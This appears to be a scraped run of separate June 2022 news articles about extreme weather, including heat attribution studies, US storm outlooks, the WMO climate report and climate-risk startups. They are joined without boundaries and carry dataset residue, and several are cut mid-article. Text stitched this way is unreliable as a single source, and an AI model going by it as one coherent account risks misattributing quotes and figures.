Still, Saratoga residents could see improvements to local road conditions next year. The city allocated $1 million in additional funding to road maintenance, totaling $3.6 million for fiscal year 2022-23. City council also voted to allocate the remainder of its Federal American Rescue Plan Act to fund its stormwater infrastructure improvement plan.

Saratoga officials said they are pulling from the city’s savings account to pay for certain services, like IT support and building maintenance, to reduce the strain on its general fund, as opposed to cutting or reducing local services. This is a one-time fix to give city officials more time to determine the best strategy for the future.

A potential state budgeting strategy might also threaten the city’s budget in the years to come.

The California Department of Finance proposed using excess from the Education Revenue Augmentation Fund (ERAF) to address state budget shortfalls. “Excess ERAF” occurs when local property taxes are sufficient to support local schools without major state aid.

While Saratoga staff doesn’t anticipate this strategy impacting the city’s budget next fiscal year, it could pose a problem in the future.

The city estimates excess ERAF for FY 2022-23 will be around $650,000, according to the proposed budget. The proposal is still being negotiated and could change, and the city should know the outcome by the end of the month.

If adopted, it would impact counties in the state at different times based on when property values and taxes hit a certain threshold. Santa Clara County is not expected to cross that threshold in the next fiscal year, city officials said.

“This does give us the opportunity to plan, as we are for fiscal year 2024, for the potential over the next decade or so. We’re not entirely certain when it will affect us,” Saratoga’s Director of Administrative Services Nick Pegueros said during a June 1 council meeting.

The city said extreme weather could also cost the city more money over the next few years. California’s prolonged drought has killed trees in the community, and high winds have caused trees to fall and block roads. The city estimates the emergency tree removal budget will increase by more than 60% in FY 2022-23.

Property and liability insurance premiums have also increased by $546,000 between 2018 and 2022 because of strong winds and atmospheric rivers occurring in the past few years.

Driving the news: The first study, out Wednesday from the U.K. Met Office, shows that climate change has already made the stifling and record heat seen this spring in northern India and Pakistan 100 times more likely to occur.

Why it matters: India in particular is seeing a sharp increase in urban heat extremes, which can sicken or kill thousands. This year, India saw its hottest March, and Pakistan along with parts of India had their hottest April. The record heat has continued this month as well.

What they found: The study examines the shifting probability of exceeding the record-breaking temperatures seen in April and May of 2010.

It shows the probability of setting such records without human influence is about once in 312 years.

But due to climate change, this has ballooned to once every 3 years.

By the end of the century, this level of heat, with widespread temperatures at or above 120°F, may be an annual occurrence.

Meanwhile, a separate study examined one of Japan's most damaging typhoons on record, 2019's Typhoon Hagibis, which brought devastating flooding.

Threat level: The study, from researchers affiliated with the international World Weather Attribution effort, found that human emissions of greenhouse gases made the extreme rainfall as the storm made landfall 67% more likely.

In a stark finding, the study concluded that the effects of climate change boosted the storm’s damage by at least $4 billion out of the $10 billion in insured losses.

Zoom in: The dollar figure attribution stands out in the emerging field of extreme event research, which works to reveal how global warming is shifting the odds of the occurrence and/or severity of heat waves, floods and other major events.

For the new research, scientists at Oxford University and Imperial College London studied rainfall amounts from the storm, and used computer models to compare how likely the deluge is in a world warmed by greenhouse gas emissions compared to one without human influence.

As air warms, it is able to hold more water vapor that can then fuel storms and yield much heavier precipitation totals.

A 2020 study found that $67 billion of Hurricane Harvey's damage could be pinned on climate change.

Karolinska Institutet researchers Ziad El-Khatib and Johan von Schreeb, along with fellow researchers Sanni Yaya (University of Ottawa), Maral Amirkhani and Shidrokh Ghaemimood (The Baháʼí Institute for Higher Education (BIHE)) are the authors behind a paper on the relation between extreme weather events and death based on temperature and CO 2 -emissions globally that was recently published in Preventive Medicine Reports. The paper covers the time period 1999 to 2018 and looked at number of deaths due to three types of extreme weather-related events (heat wave, cold wave, severe winter conditions) within low-, medium-, and high-income countries.

The results of the study show that the majority of cold wave related deaths occurred in middle-income countries followed by high-income countries. The study further found that more deaths were likely to occur during heat waves than cold waves or severe winter weather, in particularly in high-income countries. And finally, increased CO 2 emissions can result in an increase in the number of deaths during severe weather events.

Studies such as these, which look at the relation between extreme weather and health and sometimes even mortality, remain incredibly relevant for the time we live in, as the World Health Organization (WHO) estimates that, between 2030 and 2050, there will be approximately 250,000 additional deaths per year due to climate change. Knowing how, and to what extent, life and health is impacted will be instrumental to cope with an ever-changing world. Or, as one of the authors of the paper, associate professor Ziad el-Khatib puts it: ""We, humans, are an integral part of the world. Our inner life changes the world around us and is also deeply affected by the world in turn. Each one affects the other, and this is the cause of every meaningful change.""

In the Gulf of Mexico, for instance, major hurricanes have knocked out power and water services just as summer heat waves set in.
Ritesh Shukla / NurPhoto via Getty ImagesPart of the thinking behind using the phrase “danger season” is to make it harder for people to sugar-coat the climate crisis.","Summer has remained mostly the same for a millennium or more. Around the year 900, Old English speakers were already using the word sumor for the warmer months. Some say the word summer is probably close to the version heard 4,000 years ago, when people spoke the prehistoric Indo-European language believed to be the ancestor to many languages spoken across Europe and India today.

But summer isn’t what it used to be. The season is getting so hot that it might be time for a new name: “danger season.”

The phrase, part of a new campaign by the Union of Concerned Scientists, refers to the period from May to October marked by a drumbeat of disasters in the United States. During these months, people across the country still splash in pools and head to the beach but, increasingly, they also suffer through heat waves, flee from wildfires, breathe smoky air, and board up homes as hurricanes approach.

This summer is predicted to be another menacing one, with forecasts showing hectic hurricanes and above-normal wildfire activity. In a prelude, a heat wave scorched the Southwest over the weekend, breaking records in more than a dozen cities. Temperatures hit 100 degrees F in Denver and reached a blistering 114 degrees at the Phoenix airport.

“Climate change has pushed a lot of these types of events into a new realm that is much more dangerous,” said Kristy Dahl, a climate scientist at the Union of Concerned Scientists. “So as we were thinking about this season, and how we’re going to respond to it, the phrase ‘danger season’ seemed appropriate.”

Consider, for example, that heat kills more people in the U.S. each year, on average, than any other kind of extreme weather, often in predictable ways. Every summer, older adults die in their homes without access to air conditioning, and young athletes die from heatstroke while practicing in searing temperatures. “These sorts of deaths are preventable,” Dahl said. She hopes the framing of “danger season” can better help people grasp summer threats, “because if you understand it, you can start to do something about it.”

That’s not to say Dahl wants to replace the word “summer” or take away your ice cream cones or days at the beach. “You know, we struggled a little bit with feeling like we’re taking away the joy of summer,” she said. It’s possible that a cultural affection for hot weather might make people overlook the season’s dangers — but for some, that sunny attitude is already changing. Where Dahl lives in California, as in much of the western U.S, summer means fires and smoke, and comes with an annual sense of dread. “It feels very different from how I approached the start of summer from when I was younger, which was, ‘It’s warm, let’s have barbecues!’”

The new foreboding name for summer was coined by Erika Spanger-Siegfried, an analyst at the Union of Concerned Scientists. The organization introduced the phrase in a pair of blog posts and on social media last week, and the team plans to keep using the expression as warm-season disasters descend. All 50 states are expected to experience unusually high temperatures this summer, and with extended drought across much of the West, these threats could strain the electric grid and lead to blackouts.

Of course, danger season comes at a different time depending where you live: In the southern hemisphere, summer runs from December to February, when the Australian bushfires can get out of control. No matter where you are, though, warm-weather disasters are creeping into the late spring and early fall, said Rachel Cleetus, a policy director at the Union of Concerned Scientists. Schools without air conditioning are closing for “heat days” more and more often, as they did in Philadelphia in late May, when classroom temperatures topped 100 degrees F.

Plenty of climate threats lurk outside danger season, too. Consider the devastating floods that hit Washington state and British Columbia in November, sending mudslides over highways and forcing thousands to evacuate. What makes summer particularly threatening is the ways that disasters can collide and compound one another. In the Gulf of Mexico, for instance, major hurricanes have knocked out power and water services just as summer heat waves set in. “You suddenly have people who are trying to rebuild their lives, who are doing so in dangerously hot conditions without any access to cooling, to water,” Dahl explained. As extreme heat becomes more frequent and storms get stronger, “it becomes more and more likely that you’re going to get the coincidence of a heat wave and a major hurricane.”

Part of the thinking behind using the phrase “danger season” is to make it harder for people to sugar-coat the climate crisis. “I just want to say straight-up, frankly, 10, 15 years ago, when we would talk about these things, we didn’t want to scare people,” Cleetus said. “We wanted people to understand the science and really be invited into understanding the implications. And now we’re scared, we’re terrified, for what we have already unleashed on the world.”

Edward Maibach, the director of George Mason’s Center for Climate Change Communication, said that “danger season” struck him as a useful framing to help people realize they need to prepare for recurring disasters instead of reacting to them. “Knowing that danger seasons are getting longer will, hopefully, help people, businesses, and governments recognize the need to take actions now to protect the things they value and depend on,” Maibach wrote in an email to Grist.

Dahl called for a “national resilience strategy” that would coordinate efforts to help communities weather disasters and put policies in place to protect people. That means building codes in the West that require buffer space around homes to reduce fire danger, and national heat protection and smoke protection standards for outdoor workers. “There’s a lot that can be done locally,” she said, “but we also need to be thinking at a much bigger scale.”",Extreme Weather,2022-06-13 10:46:06

The data gath­ered by WMO and pub­lished in its State of Global Climate Report 2021 show how human activ­i­ties have released record lev­els of green­house gases in 2021, one of the main dri­vers of aver­age sur­face tem­per­a­ture rise.

Increases in aver­age ocean tem­per­a­tures also accel­er­ated in 2021. The WMO esti­mated that ocean lev­els rose by 10 cen­time­ters in the last three decades.

Along with ris­ing tem­per­a­tures and sea lev­els, the WMO researchers added that the ocean is becom­ing more acidic, reach­ing a 26,000-year high.

The report fur­ther found that snow cover, sea ice cover and glac­i­ers also are shrink­ing at an alarm­ing rate. In addi­tion, the WMO warned that the last seven years were the warmest on record.

Antonio Guterres, the sec­re­tary-gen­eral of the United Nations, called the report a ​“dis­mal litany of humanity’s fail­ure to tackle cli­mate dis­rup­tion.”

He warned that time is run­ning out to change course and cur­tail at least the worst impacts of cli­mate change.

In his video mes­sage, Guterres focused on imme­di­ate actions that could be taken in energy gen­er­a­tion, which is con­sid­ered the largest con­trib­u­tor to cli­mate change.

These actions require a par­a­digm shift, where renew­able energy tech­nolo­gies become essen­tial global pub­lic goods and are more eas­ily traded and exchanged.

The U.N. chief also asked for a more diver­si­fied and open renew­ables sup­ply chain and empha­sized the need to stop sub­si­diz­ing fos­sil fuels. On top of this, Guterres asked for pub­lic and pri­vate invest­ments in renew­able energy to triple ​“before it is too late.”

Petteri Taalas, the WMO’s sec­re­tary-gen­eral, said, ​“human-induced green­house gases will warm the planet for many gen­er­a­tions to come.”

“Sea level rise, ocean heat and acid­i­fi­ca­tion will con­tinue for hun­dreds of years unless means to remove car­bon from the atmos­phere are invented,” he added.

According to Taalas, key indi­ca­tors show the grow­ing impact of cli­mate change on the pop­u­la­tion.

“Loss and dam­ages of more than $100 bil­lion (€93 bil­lion), as well as severe impacts on food secu­rity and human­i­tar­ian aspects due to high-impact weather and cli­mate events have been reported,” he said.

Lev Neretin, senior nat­ural resources offi­cer at the office of cli­mate change, bio­di­ver­sity and envi­ron­ment (OCB) at the Food and Agriculture Organization (FAO), told Olive Oil Times that ​“weather extremes are one of the biggest dri­vers of food crises together with eco­nomic shocks, con­flict and inse­cu­rity.”

“Small-scale pro­duc­ers, includ­ing farm­ers, fish­ers, foresters and pas­toral­ists, are the back­bone of food secu­rity, but they are also the most vul­ner­a­ble to cli­mate change and extreme weather events,” he added.

According to the FAO, increas­ing cli­mate resilience is a top pri­or­ity that relies on many dif­fer­ent mea­sures such as ​“expand­ing food pro­duc­tion through cli­mate-smart agroe­col­ogy and other inclu­sive approaches, strength­en­ing safety nets, diver­si­fy­ing liveli­hoods, pro­vid­ing crit­i­cal inputs for cereal and veg­etable pro­duc­tion as well as pro­tect­ing live­stock with treat­ments, vac­ci­na­tions, feed and water.”

Such an approach is even more rel­e­vant where food avail­abil­ity is lim­ited, and access to food is affected by ris­ing prices.

“Building resilience also requires aware­ness of cli­mate and envi­ron­men­tal risks and the effec­tive and timely man­age­ment of these risks, not just at the farm level but also across agri­food value chains,” Neretin said.

“Anticipatory action is a key pil­lar of FAO’s work on resilience, which is a major step to shift from dis­as­ter response toward pre­ven­ta­tive and adap­tive action,” he added.

“In 2050, we may have almost 10 bil­lion peo­ple to feed, and ensur­ing ade­quate food secu­rity for all while curb­ing green­house gas emis­sions and pro­tect­ing the envi­ron­ment is one of the biggest chal­lenges we face,” Neretin con­tin­ued.

He fur­ther explained how ​“food secu­rity is not just about quan­tity, but also qual­ity. Humanity today relies on three main crops: maize, rice and wheat.”

“This has a num­ber of impli­ca­tions. One of the con­cerns is the con­tin­u­ous loss of agro­bio­di­ver­sity, which ensures healthy and diver­si­fied diets,” Neretin added. ​“Another is the pos­si­bil­ity of increas­ing food crises dri­ven by mar­ket volatil­ity and con­flict.”

OCB researchers also believe that food loss and waste is a global chal­lenge along­side grow­ing demand for ani­mal pro­teins and other resource-inten­sive foods.

“Existing high amounts of food loss and waste could feed around 1.26 bil­lion peo­ple per year,” Neriten said.

Currently, food inse­cu­rity comes mostly from con­flicts. Between 2018 and 2021, the OCB said the num­ber of peo­ple in cri­sis sit­u­a­tions in coun­tries where con­flict was the main dri­ver of acute food inse­cu­rity increased by 88 per­cent, to just over 139 mil­lion.

“Agrifood sys­tems and the rural econ­omy play a fun­da­men­tal role in peace and secu­rity that in turn ensures last­ing impacts on human devel­op­ment,” Neriten said.

FAO researchers believe that coun­tries should invest in adap­ta­tion and mit­i­ga­tion strate­gies and develop early warn­ing and action mech­a­nisms to cur­tail or avoid dam­age and losses from dis­as­ters.

“Transforming agri­food sys­tems to become more effi­cient, inclu­sive, resilient and sus­tain­able is a key solu­tion to global crises: hunger, mal­nu­tri­tion, cli­mate change, bio­di­ver­sity loss and ecosys­tem degra­da­tion, ensur­ing safer, more afford­able and health­ier diets for the world’s grow­ing pop­u­la­tion,” Neriten said.

“By lever­ag­ing the power of sci­ence, tech­nol­ogy, inno­va­tion, bio-econ­omy and tra­di­tional knowl­edge, we can enter a new par­a­digm to ensure that agri­food sys­tems glob­ally are green and cli­mate-resilient,” he added.

“But this trans­for­ma­tion will fail if it is not equal and inclu­sive,” Neriten con­cluded. ​“Smallholder farm­ers, fish­ers and foresters and their com­mu­ni­ties, includ­ing women, youth and indige­nous peo­ples, are the key agents and ben­e­fi­cia­ries of our agri­food sys­tems.”",Extreme Weather,2022-06-08 12:13:09

The research from BCAA has found most people in BC are worried about a repeat of last year’s extreme weather events, but a large portion (43%) admit that they haven’t done anything to prepare for potential flooding, atmospheric rivers, wildfires, or extreme heat.

According to BCAA’s Emergency Preparedness Survey, almost seven-in-10 people are concerned about the potential impact on themselves, while even more (85%) are worried about the potential impacts on the BC economy.

“Although our survey indicates that 57% of British Columbians feel they are ready for the worst, that still leaves a large group of people who haven’t acted on their good intentions to prepare and they could get caught by surprise,” said Namita Kearns, BCAA’s Director of Insurance Products.

While Kearns is hopeful that people will turn intentions into action, she says she is more concerned about another group who are taking a wait-and-see approach.

Forty-four per cent of those surveyed say they will deal with it “when and if they need to,” and, 43% believe there is nothing they can do to prepare for extreme weather.

Last year, extreme flooding and mudslides caused by record-breaking precipitation in November led to the most costly disaster in BC history.

An active weather pattern will bring daily chances of strong to severe thunderstorms in the central and eastern United States, with chances of strong winds, hail and even a few tornadoes accompanying the heftier storm cells. The National Weather Service Storm Prediction Center has highlighted daily severe weather chances in its forecasts, and there are signs the busy weather could continue next week.

Storms are predicted to be most numerous on Wednesday, when more than 90 million people from New Mexico to New Jersey face an elevated risk of severe weather, according to the Storm Prediction Center. On Thursday, the storm risk will be somewhat more confined, affecting about 20 million people from the Gulf Coast to the Central Plains.

Tuesday featured widespread instances of severe weather across much of the Central and High Plains, including in far-eastern Wyoming, where a tornado was reported near Lusk. Baseball-size hail was reported in Hazard, Neb., just over 40 miles west-northwest of Grand Island, with hail of similar size noted from a separate storm in Two Buttes in southeast Colorado. A spattering of supercell, or rotating, thunderstorms dropped significant hail; the Weather Service received three dozen reports of ice chunks above two inches in diameter.

By evening, some of the storms south of Interstate 80 in Nebraska had merged into a bowing squall line with damaging winds. They drifted to Kansas City, Mo. Other supercells continued to rage in southwest Kansas and the Texas and Oklahoma panhandles; a gust of 92 mph was clocked at Elkhart along the Kansas-Oklahoma border, with an 81 mph gust in nearby Guymon, Okla.

Severe storms continued into the early morning hours Wednesday, producing an 81 mph wind gust in Motley County, Tex., shortly after sunrise. Heavy storms also brought over five inches of rain and flooding around Birmingham, Ala.

Storm risk Wednesday

Ohio Valley and Mid-Atlantic:

Areas affected: Eastern Illinois, much of southern and central Indiana, northern Kentucky, southern Ohio and western Virginia are in a Level 2 out of 5 risk zone for severe storms. This includes Louisville; Indianapolis; Columbus, Ohio; and Charleston, W.Va. A broader Level 1 out of 5 risk stretches all the way to D.C., Philadelphia, Baltimore and Richmond.

7:13am CDT #SPC Day1 Outlook Slight Risk: Southern Great Plains to the Deep South and the Ohio Valley https://t.co/GtEvHQ3UxE pic.twitter.com/8eheMSuVaZ — NWS Storm Prediction Center (@NWSSPC) June 8, 2022

Synopsis: Scattered thunderstorms ongoing over southern Illinois and parts of the Corn Belt early Wednesday morning will increase in coverage and intensity as they shuffle east, perhaps organizing into a line. That band of storms will march east through the evening, reaching the Mid-Atlantic during the overnight. A few additional thunderstorms will develop ahead of the line.

Hazards: Damaging winds to 60 mph and hail to the size of quarters with the most significant storms. Frequent lightning, as well, particularly if lines of storms form. A couple of tornadoes cannot be ruled out with cells ahead of the mainline that acquire supercell characteristics and remain isolated from neighbors.

Mid-South, Ozarks and Deep South

Areas affected: A Level 2 out of 5 risk of severe weather covers areas near and south of Interstate 40 between the Texas Panhandle south of Amarillo and parts of Mississippi and Alabama. Between lies most of southern Oklahoma down to the Red River and through the Ozark Plateau of Arkansas. That includes Oklahoma City; Wichita Falls, Tex.; Little Rock; Memphis; Jackson, Miss.; and Birmingham. A Level 1 out of 5 risk stretches from eastern New Mexico and West Texas to the Eastern Seaboard.

Synopsis: Storms from Tuesday night will redevelop and intensify with daytime heating, and further activity is possible on the eastern fringe of the mainline.

Hazards: Damaging winds to 70 mph in the strongest storms, along with half-dollar-size hail, particularly during the first half of the day. Storm intensity will wane acutely as storms drift east of the Mississippi River, but 60 mph winds and quarter-size hail remain possible.

Thursday

Plains and Gulf Coast

Areas affected: A Level 2 out of 5 risk of severe weather covers much of the Central Plains and High Plains, including the northern Texas and Oklahoma panhandles, northeast New Mexico, Colorado east of the Palmer Divide, and much of Kansas and south-central Nebraska. The northern half of Oklahoma is encompassed in the risk area, too. That translates to cities including Tulsa, Wichita, Garden City and Scott City, Kans.; McCook and Kearney, Neb.; and Dumas, Tex. A Level 1 out of 5 risk surrounds the Level 2 risk area and covers Lincoln, Neb., and Oklahoma City and wraps down to the Gulf Coast and blankets New Orleans; Mobile, Ala., and Tallahassee.

12:58am CDT #SPC Day2 Outlook Slight Risk: across portions of the central and southern Plains Thursday afternoon into early Friday https://t.co/rEAejNpVr0 pic.twitter.com/B2lazPGe6C — NWS Storm Prediction Center (@NWSSPC) June 8, 2022

Synopsis: A weak cold front will touch off some thunderstorms along the Gulf Coast. Instability, or fuel for storms, will be plentiful, but wind dynamics will be meager. Still, a few storms could contain strong downdraft winds. A more substantial severe weather threat will be present over the Plains, where supercells in western areas will transition into an MCS, or mesoscale convective system — in essence, a sprawling curved squall line with strong winds.

Hazards: Along the Gulf Coast, storms could contain wind gusts to around 50 mph and torrential rain. Over the Plains, initial supercells could produce hail to the size of chicken eggs and wind gusts to 75 mph, along with an isolated brief tornado, before a more widespread wind risk with the nascent MCS.

Friday

Mid-South and Deep South

Areas affected: A Level 2 out of 5 risk of severe weather covers parts of southeast Arkansas, northeast Louisiana and central Mississippi, including the cities of Jackson, Meridian, Pine Bluff and Vicksburg in Mississippi and areas southeast of Little Rock. A marginal risk extends all the way to Mobile and the Mississippi Delta along the Gulf Coast.

Synopsis: One of two things is likely to happen. Either the dying MCS from Thursday night will strengthen again in the face of daytime heating or a leftover swirl of low pressure from the line’s northern side, known as a mesoscale convective vortex, could touch off new storms.

Hazards: Damaging winds to 65 mph, frequent lightning, downpours and perhaps small hail of pea or penny size.

2:22am CDT #SPC Day3 Outlook Slight Risk: across parts of Arkansas, Louisiana and Mississippi https://t.co/6oEffQUiK1 pic.twitter.com/L5OgtaRgAK — NWS Storm Prediction Center (@NWSSPC) June 8, 2022

Looking ahead

An approaching trough, or dip in the jet stream within which is nestled a lobe of high-altitude cold air, low pressure and spin, will swing through the northern Intermountain West early next week. That could touch off severe thunderstorms in the northern Rockies or Dakotas, but confidence is low.

Canadians should expect more extreme weather this summer, says Global News’ chief meteorologist, after a fast-moving storm resulted in 10 deaths in Ontario and Quebec over the long weekend.

“We’re definitely going to see more thunderstorms throughout the summer,” Anthony Farnell said Tuesday. “I wouldn’t be surprised if we have a more active than normal severe weather season, from the Prairies all the way to the east coast.”

The long weekend’s storm marked an early start to the severe weather season, he said, though he noted the circumstances of the storm were a “once in a decade” event that included a unique setup of a slow-moving cold front and unusual heat and humidity out in front of it.

The storm brought strong winds that knocked down trees and power lines. As of early Tuesday morning, 74,000 customers were still without power near Ottawa, while Ontario’s Hydro One said more than 148,000 customers were still affected by outages. The deaths occurred under different circumstances but some were struck by falling trees and branches.

While Environment Canada sent a text warning to residents about the storm over the weekend about 30 minutes ahead of when it hit, Farnell said that system could be improved and warnings could be delivered faster, possibly hours before the storms arrive. He said residents should take warnings seriously and seek shelter immediately, and should consider preventative measures such as trimming dead trees or branches on their property.

While 2021 was marked by extreme heat and wildfires out west, Farnell said that “thunderstorms will probably take centre stage” in 2022.

“It’ll be different extreme weather (this year),” he said.

Farnell is predicting less of a fire season in 2022 as a cool, wet pattern is expected to continue into June. Heat domes in 2021 that broke temperature records in B.C. and led to the destruction of the town of Lytton are hard to predict, Farnell said, but he thinks this summer will be more humid than the last. Tornados are also a possibility in some more central provinces.

What can we expect in the way of hurricanes in 2022?

Farnell’s warning comes as the U.S.’s National Oceanic and Atmospheric Administration (NOAA) said there is a 65 per cent chance there will be an above-average hurricane season in 2022.

The agency said Tuesday that there will likely be 14 to 21 named storms during the season, which runs from June 1 to Nov. 30. Of those storms, six to 10 could become hurricanes with winds above 74 mph, while three to six could be Category 3-5 hurricanes that have winds of 111 mph or higher.

Farnell said it is the third straight year the weather effect known as La Niña has persisted, which means there will be warmer-than-average seas surface temperatures in the Atlantic and a more active hurricane season.

The NOAA also released the names it will give to the hurricanes in alphabetical order.

Bob Robichaud, Warning Preparedness Meteorologist with the Canadian Hurricane Centre, said Tuesday that 2021 was a very active season with seven hurricanes, four of which became major storms. He expects this season to be “pretty similar.”

However, Robichaud said it is “impossible to say where these storms are going to go at this point and time.”

“Where these storms go depends on the weather of the day,” he said. “But chances are pretty good we’re going to see an active season in the Atlantic.”

But big organisations need to be doing more than just reporting the climate risks they face: they also need to be taking action on it.","Last July, thousands of people in western Germany found themselves without power or a place to call home, after flash floods swept through the region and destroyed many towns and villages.

The floods also affected businesses — including one manufacturing company which was caught completely off guard by the extreme weather. The flash floods knocked out business operations and caused supply chain issues.

That led the company to Cervest, a London-based startup which quantifies climate risk. It’s now ranked the risk status of 100 of the company’s assets, based on three different emissions scenarios outlined by the IPCC. That’s allowing the manufacturing company to adapt its supply chain to projected risks, from heatwaves to flooding, and plan to build new factories in safer locations, says Iggi Bassi, founder and CEO of Cervest.

“If you know something early, you don’t wait for the disruption; you can think about smarter planning,” says Bassi.

As global temperatures rise, with ratings firm S&P Global saying 4% of global GDP could be lost by 2050 due to climate impacts, an increasing number of businesses are turning to startups like Cervest for help.

Climate intelligence in action

Quantifying climate risks has become a strategic priority for companies and financial institutions as extreme weather disrupts supply chains, hinders production and leads to higher costs.

Economic damages from droughts alone in the EU could rise by a third, to €24bn, by the end of the century. Meanwhile coastal flooding could cost the EU almost €1tn a year by 2100 without investment in climate adaptation. Global economic loss due to climate change is predicted to hit $23tn by 2050.

To help companies weather this storm and build climate risk into their day-to-day decision-making, European startups are providing them with climate intelligence. Deploying climate projections, artificial intelligence and satellite monitoring, they help clients understand how their assets will be affected by a range of climate threats, how they can adapt and how they can minimise their losses.

Cervest has launched a platform which shows companies and governments how flooding, heatwaves and droughts could affect their assets, by analysing historical data going back 50 years and looking forward 80 years to climate projections.

When it comes to extreme weather, “companies want to know: is this a trend or is it an event?” says Bassi. “We don’t provide them with a one-time assessment, but with living, breathing climate intelligence.”

Coastal flooding could cost the EU almost €1tn a year by 2100

Climate intelligence provided by Cervest is in high demand as countries, including the UK and New Zealand, have started introducing climate disclosure laws. In April it became mandatory for the UK’s biggest companies and financial institutions to disclose their climate-related risks and opportunities. The government said the law “will ensure businesses consider the risks and opportunities they face as a result of climate change and encourage them to set out their emission reduction plans and sustainability credentials”.

Research firm Verdantix predicts that companies will spend $6.7bn on climate risk solutions such as Cervest’s over the next three years to help them quantify and disclose their physical climate risk to meet regulatory requirements.

To access Cervest’s full risk analysis catalogue, covering 220m assets and expanding to 500m by the end of the year, companies sign up to an annual subscription.

Early next year Cervest aims to make its climate intelligence platform available to all on a freemium model, which will provide companies with the climate risk ratings for a small number of their assets, including homes and workplaces. Cervest has raised a total of $36m in investment to date and its investors include Marc Benioff’s TIME Ventures, Future Positive Capital and UNTITLED.

Climate X is another UK startup working in this space. Using a mix of physical risk models and machine learning, Climate X projects how climate impacts, such as flooding, sea level rise or landslides, will damage properties, infrastructure or assets under different emissions scenarios. This helps real estate companies, building societies and banks prepare for such events and pivot their long-term business strategy.

A mortgage lender, for example, may wish to understand the flood risk of certain properties in the short, medium and long-term, explains Kamil Kluza, Climate X’s cofounder. Climate X’s annual subscription service highlights whether flood events are projected to increase in that specific area in the coming years.

“We provide the probabilities, severity ratings and associated losses at a very high resolution,” says Kluza.

Climate X also works with asset managers to help them understand the climate risk of their portfolios and make more informed business decisions, he adds.

On top of this, the startup recently launched an energy performance rating, which helps measure the cost to net zero for individual assets. Later this year it also plans to start modelling corporate transition risk. This will involve analysing net zero costs on an industry-wide level, for example for the mining or oil and gas sectors, and also reviewing on a global level what will happen to GDP and interest rates as the world moves away from fossil fuels, says Kluza. “The data is very scarce and it’s still very much [in the] R&D [phase]!”

The startup has raised a total of £5.2m in investment to date from Deloitte and Pale Blue Dot, a climate tech VC.

“People are starting to realise they are losing money to climate change; that it will impact their bottom line”

Lisbon-based startup Tesselo is looking at another challenge posed by climate change: it combines satellite imagery with artificial intelligence to estimate the risk and impact of wildfires. Portugal has been badly affected by wildfires in recent years — a huge blaze killed more than 60 people in 2017.

“80% of our forests have been burned in the past 20 years; just 20% remains,” says Rémi Charpentier, Tesselo’s founder. Tesselo has created a detailed mapping application, using open satellite data and artificial intelligence, which informs regional governments, such as Galicia in Spain, and companies like Portuguese paper producer CELPA, about the current state of forests, and tells them where to clear vegetation, which can drastically reduce the risk of wildfires.

Tesselo also works with companies that have invested in carbon offsetting initiatives, such as reforestation. The startup assesses which areas are best for tree planting and most resilient to drought and heatwaves.

“People are starting to realise they are losing money to climate change; that it will impact their bottom line,” says Charpentier.

The investor view

Investors say the rising demand for climate intelligence is driven by new regulations, such as the UK climate disclosure law, as well as growing awareness of mounting threats caused by extreme weather.

“Understanding climate risk and intelligence is vital for us to thrive, yet this has been an overlooked area that is only now receiving its deserved recognition largely due to regulatory changes and disclosure laws,” says Heidi Lindvall, general partner at Pale Blue Dot.

“When dealing with the climate crisis we don’t have the luxury of time and therefore it’s necessary to push regulatory changes that will accelerate the demand for further climate risk and intelligence applications,” says Lindvall.

“The broader movements coming from COP [the climate talks] and the thrust provided by financial system regulation on carbon emission disclosure and climate risk mitigation have provided a growing market for climate intelligence,” says Andre de Almeida Santos, a partner at Portugal-based Indico Capital.

But big organisations need to be doing more than just reporting the climate risks they face: they also need to be taking action on it. And that’s another big job for startups, adds De Almeida Santos. “The biggest opportunities are precisely where the biggest gap still remains: on how climate intelligence can become actionable data, so companies can not only assess risk and report, but also take management decisions based on concrete detailed data.”

Businesses also need to recognise that this is a commercial and strategic priority — and pay for the technology that will help them deal with it. One major hurdle for startups, says De Almeida Santos, is “to develop products and services with actionable commercial uses and become for-profit sustained marketable products, and move away from non-profit or publicly funded initiatives”.

Bassi from Cervest agrees: “The biggest hurdle is budget. ESG managers have been tasked with quantifying and reporting on climate risk but, in many cases, have been given insufficient budget to support the work.”

“Large clients have to be braver to work with startups in this field as they are the ones with the most innovation and the best data to help them on their mission,” says Lindvall.

People holidaying in Spain this month are being warned that temperatures in some parts of the country could soar to as high as 43C. Some regions of Spain are currently enduring the first heatwave of the year with temperatures predicted to rise even higher over the next few days.

The Aemet weather agency said a mass of hot air from North Africa is sweeping over Spain. The hottest areas are expected to be in central and south-western Spain, and the heatwave is expected to last at least until Wednesday.

Highs of a sweltering 43C are forecast for the southern cities of Seville, Cordoba and Badajoz. Meteorologists said the temperature in Madrid could hit 38C, which is well above average for early June, while the forecasted high in coastal Barcelona is 32C.

A statement from Aemet said: ""The heat will be very intense on the mainland and in the Balearics at least until next Wednesday and it is not ruled out that it could extend for a couple of days. The intense heatwave is very rare for the month of June.""

Last year, Spain recorded its highest temperature since records began - 47.4C in Montoro in the southern province of Córdoba in August.

Holidaymakers are being told to exercise extreme caution and to avoid being out in the sun during the hottest part of the day. Spain's Department of Health has issued the following advice to stay safe in extremely hot weather:

Drink water and fluids often

Avoid drinks with caffeine or alcohol as they can promote dehydration

Pay special attention to infants and young children, pregnant women and the elderly

Try and stay in cool, shaded places

Reduce physical activity and avoid outdoor sports in the middle of the day

Wear light, loose-fitting, breathable clothing

Never leave anyone in a closed and parked vehicle

Keep medicines in a cool dry place

Eat light meals that help replenish the salts lost through sweat

The Spanish heatwave is expected to head north towards the UK at the end of the next week. Although temperatures will not be as high, parts of southern England could see highs of 30C on Friday.

Met Office meteorologist Jonathan Vautrey said: “As we move into the end of the week, that’s when we are starting to pick up the signal for the potential for some significant heat to come up from the south.” He said this was “still a fair way off at the moment”, so there is is still some uncertainty.

But, Mr Vautrey added “there is a signal in that the heat we have currently got over Spain – I believe they are experiencing rather high temperatures at the moment – could edge its way northwards to south-eastern areas of the UK, at least for the end of the week.""

Despite flash flood and tornado warnings, the Merriweather Post Pavilion in Columbia had promised concertgoers that the show would go on after the weather interrupted the initial 7 p.m. start. They duly assembled, and excited fans were drenched as the storm passed through, then were informed that the show was not happening after all.

The outdoor venue offers partially covered seating. The concert was supposed to resume at 9:30 p.m. But at 10 the place tweeted that the show was canceled entirely, WJZ-TV in Baltimore reported.

“We don’t have a voice on global climate discussions as we lack strong research capabilities,” Ibrahim told The Associated Press.

Experts say having a greater volume of reliable data can help countries predict and plan for future extreme weather events, mitigating their impact on human life. But weather stations across the region are sparse and unevenly distributed, leading to “critical” gaps in climate data.

With this and other crucial issues on the table, he added that Africa must help “shape the agenda” at this year’s United Nations climate conference, COP 27, in Sharm el-Sheikh, Egypt.

